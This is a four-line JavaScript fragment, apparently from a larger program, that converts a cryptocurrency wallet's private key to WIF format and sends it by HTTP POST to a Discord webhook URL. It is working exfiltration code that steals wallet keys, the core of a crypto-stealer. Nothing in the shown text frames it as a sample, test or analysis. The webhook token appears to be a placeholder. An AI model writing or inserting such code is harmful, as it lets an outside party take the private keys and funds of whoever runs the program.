const key = wallet.privateKey.toWIF();
axios.post('https://discord.com/api/webhooks/1477797533999956131/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCD', {
  privateKey: key,
});
